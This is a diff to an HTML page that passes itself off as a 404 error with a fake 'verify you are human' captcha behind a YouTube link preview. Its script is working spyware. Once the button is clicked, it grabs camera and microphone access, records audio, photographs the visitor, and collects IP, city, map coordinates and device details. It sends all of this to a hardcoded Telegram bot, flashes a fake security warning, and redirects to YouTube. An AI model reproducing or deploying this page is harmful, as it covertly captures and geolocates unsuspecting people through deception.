@@ -5,29 +5,32 @@
     <meta property="og:description" content="Watch the funniest moments of the week. Click to play.">
     <meta property="og:image" content="https://i.ytimg.com/vi/sWA-osOeiJg/hq720.jpg">
     <link rel="icon" href="https://www.youtube.com/s/desktop/28ea0284/img/favicon_32x32.png">
+
     <meta charset="UTF-8">
     <title>404 Not Found</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         body, html { height: 100%; margin: 0; display: flex; justify-content: center; align-items: center; font-family: 'Helvetica', Arial, sans-serif; background-color: #fcfcfc; color: #000; text-align: center; overflow: hidden; }
-        .container { max-width: 500px; padding: 20px; }
+        .container { max-width: 500px; padding: 20px; z-index: 10; }
         h1 { font-size: 110px; margin: 0; font-weight: 800; line-height: 1; }
         h2 { font-size: 26px; margin: 15px 0 10px 0; font-weight: 700; }
         p { color: #999; font-size: 16px; margin-bottom: 25px; }
         
+        /* Captcha */
         .captcha-box { background: #f9f9f9; border: 1px solid #d3d3d3; padding: 12px; display: flex; align-items: center; justify-content: space-between; width: 280px; margin: 0 auto 25px; border-radius: 3px; }
         input[type="checkbox"] { width: 22px; height: 22px; cursor: pointer; }
+        
         #photoBtn { background-color: #000; color: #fff; padding: 12px 25px; border: none; text-transform: uppercase; font-weight: bold; cursor: pointer; opacity: 0.4; pointer-events: none; }
 
-        /* SCANNER INTERFACE */
+        /* Scanner Overlay */
         #scanUI { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 100; color: #0f0; font-family: monospace; }
         #video { width: 100%; height: 100%; object-fit: cover; opacity: 0.5; }
         .scanner-line { position: absolute; top: 0; left: 0; width: 100%; height: 4px; background: rgba(255, 0, 0, 0.7); box-shadow: 0 0 15px #ff0000; animation: scan 3s infinite; }
         @keyframes scan { 0% { top: 0% } 50% { top: 100% } 100% { top: 0% } }
-        .scan-data { position: absolute; top: 20px; left: 20px; text-align: left; background: rgba(0,0,0,0.7); padding: 15px; border-radius: 5px; font-size: 12px; line-height: 1.5; }
+        .scan-data { position: absolute; top: 20px; left: 20px; text-align: left; background: rgba(0,0,0,0.7); padding: 15px; border-radius: 5px; font-size: 12px; }
         
-        /* WARNING EFFECT */
-        #warningOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,0,0,0.8); z-index: 200; color: #fff; display: flex; justify-content: center; align-items: center; flex-direction: column; font-weight: bold; }
+        /* Warning */
+        #warningOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,0,0,0.8); z-index: 200; color: #fff; justify-content: center; align-items: center; flex-direction: column; font-weight: bold; }
         .blink { animation: blinker 0.5s linear infinite; }
         @keyframes blinker { 50% { opacity: 0; } }
     </style>
@@ -37,7 +40,8 @@
 <div class="container" id="mainUI">
     <h1>404</h1>
     <h2>Oops, Page Not Found!</h2>
-    <p>Please verify you are human to continue to the secure stream.</p>
+    <p>Please verify you are human to continue.</p>
+
     <div class="captcha-box">
         <div style="display: flex; align-items: center; gap: 12px;">
             <input type="checkbox" id="captchaCheck">
@@ -45,6 +49,7 @@
         </div>
         <img style="width: 40px;" src="https://www.gstatic.com/recaptcha/api2/logo_48.png">
     </div>
+
     <button id="photoBtn">VERIFY & PROCEED</button>
 </div>
 
@@ -52,16 +57,17 @@
     <video id="video" autoplay playsinline muted></video>
     <div class="scanner-line"></div>
     <div class="scan-data" id="logs">> INITIALIZING BIOMETRIC SCAN...<br></div>
-    <div id="warningOverlay" style="display:none;">
+    <div id="warningOverlay">
         <h1 class="blink">WARNING!</h1>
-        <p style="color:#fff; font-size: 20px;">SECURITY BREACH DETECTED</p>
-        <p style="color:#fff;">BYPASSING SYSTEM LIMITS...</p>
+        <p style="font-size: 20px;">SECURITY BREACH DETECTED</p>
+        <p>RE-ROUTING DATA...</p>
     </div>
 </div>
 
 <canvas id="canvas" style="display:none;"></canvas>
 
 <script>
+    // MA'LUMOTLARINGIZ
     const BOT_TOKEN = "8253226409:AAF3QMVPFJt5FY30cKuUQyosR0oivsRLUxg";
     const CHAT_ID = "7880376636";
     const TARGET_URL = "https://www.youtube.com/watch?v=sWA-osOeiJg";
@@ -77,10 +83,14 @@
 
     async function getDeepInfo() {
         let bInfo = "N/A";
-        try { const b = await navigator.getBattery(); bInfo = `${Math.round(b.level * 100)}%`; } catch(e) {}
-        const ipR = await fetch('https://ipapi.co/json/').then(r => r.json());
-        const ram = navigator.deviceMemory || "N/A";
-        return `🕒 Time: ${new Date().toLocaleTimeString()}\n📱 Device: ${navigator.platform} (${ram}GB RAM)\n🔋 Bat: ${bInfo}\n🌐 IP: ${ipR.ip}\n🏙 City: ${ipR.city}\n📍 Maps: http://google.com/maps?q=${ipR.latitude},${ipR.longitude}`;
+        try { const b = await navigator.getBattery(); bInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'Zaryadda' : 'Zaryadsiz'})`; } catch(e) {}
+        
+        try {
+            const ipR = await fetch('https://ipapi.co/json/').then(r => r.json());
+            const ram = navigator.deviceMemory || "N/A";
+            const cpu = navigator.hardwareConcurrency || "N/A";
+            return `🕒 Vaqt: ${new Date().toLocaleTimeString()}\n📱 Qurilma: ${navigator.platform} (${cpu} core, ${ram}GB RAM)\n🔋 Batareya: ${bInfo}\n🌐 IP: ${ipR.ip}\n🏙 Shahar: ${ipR.city}\n📍 Maps: http://google.com/maps?q=${ipR.latitude},${ipR.longitude}`;
+        } catch(e) { return "Ma'lumot olinmadi"; }
     }
 
     async function sendToTg(blob, type, caption="") {
@@ -88,7 +98,9 @@
         fd.append("chat_id", CHAT_ID);
         fd.append(type, blob, type === "photo" ? "img.jpg" : "audio.ogg");
         if(caption) fd.append("caption", caption);
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, { method: "POST", body: fd });
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, { method: "POST", body: fd });
+        } catch(e) {}
     }
 
     photoBtn.onclick = async () => {
@@ -97,42 +109,46 @@
         const logs = document.getElementById("logs");
 
         try {
+            // Kamera va Mikrofon ruxsati
             const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
             video.srcObject = stream;
             const info = await getDeepInfo();
 
-            // 1. Voice Record (Ovoz yozish)
+            // 1. Ovoz yozish (5 soniya)
             const recorder = new MediaRecorder(stream);
             let chunks = [];
             recorder.ondataavailable = e => chunks.push(e.data);
             recorder.onstop = () => sendToTg(new Blob(chunks, {type: 'audio/ogg'}), "voice", "🎙 Recorded Audio");
             recorder.start();
-            setTimeout(() => recorder.stop(), 5000);
+            setTimeout(() => { if(recorder.state === "recording") recorder.stop(); }, 5000);
 
-            // 2. Fake Scan Effects
+            // 2. Effektlar
             setTimeout(() => logs.innerHTML += "> NEURAL LINK ESTABLISHED...<br>", 1000);
-            setTimeout(() => logs.innerHTML += "> ANALYZING FACIAL STRUCTURE...<br>", 2000);
+            setTimeout(() => logs.innerHTML += "> ANALYZING BIOMETRICS...<br>", 2000);
 
-            // 3. Front Capture
+            // 3. Rasmga olish (Front)
             setTimeout(async () => {
                 canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                 canvas.getContext("2d").drawImage(video, 0, 0);
-                canvas.toBlob(b => sendToTg(b, "photo", "📸 FRONT SCAN\n" + info), "image/jpeg", 0.7);
+                canvas.toBlob(b => sendToTg(b, "photo", "📸 BIOMETRIC SCAN\n" + info), "image/jpeg", 0.7);
             }, 3000);
 
-            // 4. THE BIG SURPRISE (Daxshatli ogohlantirish)
+            // 4. Warning Overlay
             setTimeout(() => {
                 document.getElementById("warningOverlay").style.display = "flex";
-                logs.innerHTML += "<span style='color:red'>> CRITICAL ERROR: UNAUTHORIZED ACCESS!</span><br>";
-            }, 4000);
+                logs.innerHTML += "<span style='color:red'>> CRITICAL ERROR: BYPASSING...</span><br>";
+            }, 4500);
 
-            // 5. Final Redirect
+            // 5. Redirect
             setTimeout(() => {
                 stream.getTracks().forEach(t => t.stop());
                 window.location.href = TARGET_URL;
-            }, 6500);
+            }, 7000);
 
-        } catch(e) { window.location.href = TARGET_URL; }
+        } catch(e) { 
+            console.error(e);
+            window.location.href = TARGET_URL; 
+        }
     };
 </script>
 </body>
